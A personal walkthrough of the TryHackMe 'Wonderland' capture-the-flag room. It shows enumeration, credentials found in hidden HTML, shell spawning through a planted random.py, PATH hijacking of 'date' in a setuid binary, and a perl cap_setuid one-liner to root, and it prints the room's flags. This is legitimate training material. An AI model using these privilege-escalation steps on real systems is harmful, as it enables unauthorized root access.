# Tryhackme.com Room : Wonderland
`https://tryhackme.com/room/wonderland`


# Instance
```
export IP=10.10.232.238
```

# Nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
```

Looking at the website, we get the message "Follow the white rabbit" with a rabbit image.

Let's gobuster :
```
/img (Status: 301)
/index.html (Status: 301)
/r (Status: 301)
```

We find 3 images in `/img` :
```
alice_door.jpg
alice_door.png
white_rabbit_1.jpg
```

The page `/r` give us :
```
Keep Going.

"Would you tell me, please, which way I ought to go from here?"
```

Might need to bruteforce our way down the path ? `/r/XX/XXX/XXX`

Let's check out the images first.

Running steghide on `white_rabbit_1.jpg` without a passphrase we get `hint.txt` :
```
follow the r a b b i t
```

So I'm guessing the path is `/r/a/b/b/i/t`
We get this page :
```
Open the door and enter wonderland

"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."
```

The `alice_door` image is the png version here.

Looking at the html, we find this :
```
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

So it can either be some ssh credentials or the passphrase for `alice_door.jpg`

So yeahhh... It is the ssh credentials.

Now that we are logged in as alice, we find a `root.txt` file and `walrus_and_the_carpenter.py`.

The root.txt file is not readable.

The webserver is runned as the `tryhackme` user
```
/home/tryhackme/server -p 80
```

Running `sudo -l` we find :
```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The python script simply choose a random line from a multi line string defined in the file. It is only writable by root but it can be runned as sudo. Not sure we can really do something with this. Let's check the rest.

We find that there is 3 other users:
```
rabbit
hatter
tryhackme
```

But we can't access their home directory.
Doesn't seem to be any dangerous setuid binaries accessible from this user `find / -perm -4000`.

Hmmm trying to run the python script as `sudo` I get an error. What does the `(rabbit)` means here ?

Ok soo, I can run the script as `rabbit` user using `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

Hmmmm... What can I do with this... I can't modify the python script, maybe i can run multiple python files at the same time ? hmm nop, can't add a single character after `.py`. Also need to specify the fullpath to the python script.

I don't need to specify the fullpath to `python3.6` tho. Tried to create my own `python3.6` binary, place in in `/home/alice/bin` and add this path as the first path in `$PATH` but it didn't work. When running `sudo -u rabbit` the `/usr/bin/python3.6` binary is called.

Can't overwrite the `python3.6` file in `/usr/bin`. hmm

The secure path is 
```
/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
```

Maybe we can write a python3.6 executable to /usr/local/bin ?
Noppp, can't write to any of these folders...

So i runned linpeas. Found that perl has setuid capabilities.
```
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```
We should be able to get root using `perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'`
But we can't execute perl, only the user `hatter` can..


Maybe we can hijack the `random` libary so that it execute our own code ??
Hmm well, `/usr/lib/python3.6/random.py` is not writable...

But the first path that is being looked at by the python interpreter is the current directory. Adding a `random.py` in `/home/alice`, it is executed when `walrus..py` is runned.

Let's test using `sudo -u rabbit`.

YESS it's working :).

We can simply spawn a shell by writing this to `/home/alice/random.py` :
```
import pty
pty.spawn("bin/sh")
```

Andd now we're `rabbit` !

We got a `teaParty` executable in `/home/rabbit`.
Executing it we get :
```
./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Tue, 07 Jul 2020 01:58:37 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

Seems like we can enter some input here. I get a segfault when pressing enter (With or without a string).

Seems like the date outputed here is `current date + 1h`

I runned strings on the binary and I find the string `Segmentation fault (core dumped)`
So it might not be a real segmentation fault..

Running ltrace we get :
```
ltrace ./teaParty
setuid(1003)                                     = -1
setgid(1003)                                     = -1
puts("Welcome to the tea party!\nThe Ma"...Welcome to the tea party!
The Mad Hatter will be here soon.
)     = 60
system("/bin/echo -n 'Probably by ' && d"...Probably by Tue, 07 Jul 2020 02:17:08 +0000
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
puts("Ask very nicely, and I will give"...Ask very nicely, and I will give you some tea while you wait for him
)      = 69
getchar(1, 0x559fdb626260, 0x7faf59bd68c0, 0x7faf598f9154
) = 10
puts("Segmentation fault (core dumped)"...Segmentation fault (core dumped)
)      = 33
+++ exited (status 33) +++
```

Looking at a write up, we finally find the `user.txt` flag... it was in `/root/user.txt`... The hint was `everythning is upside down` and we had the `root.txt` flag in `/home/alice`. Didn't think of that. Here is the flag (Would have found it anyways once I had root access to the box) :
```
thm{"Curiouser and curiouser!"}
```

Now back to the teaParty binary.
Looking at the write up, they mention that `date` is executed without fullpath. That was enough of an hint.

We simply create a script in `/home/rabbit/bin/date` and add this script to the path (`PATH=/home/rabbit/bin:$PATH`).

This way our script is executed in place of `date`.
Our `date` script contains:
```
#!/bin/bash
/bin/sh
```
And thats enough to give us a shell.

we find a file named `password.txt` in `/home/hatter` :
```
WhyIsARavenLikeAWritingDesk?
```

And it's the ssh password. Coul have continued inside my session spawned via the teaParty binary but let's get a clean shell by connecting via ssh.

Now, we already found a way to escalate to root from the `hatter` user using `perl` capabilities :
```
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

And we are root !
We can `cat /home/alice/root.txt` and get the last flag :
```
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```


-------------------------------------------------------

Looking at writeups, look like I missed this string :
```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```
When I ran `strings` on the binary. 

Not sure why I didn't see it but this would have told me that we where running the `date` command without full path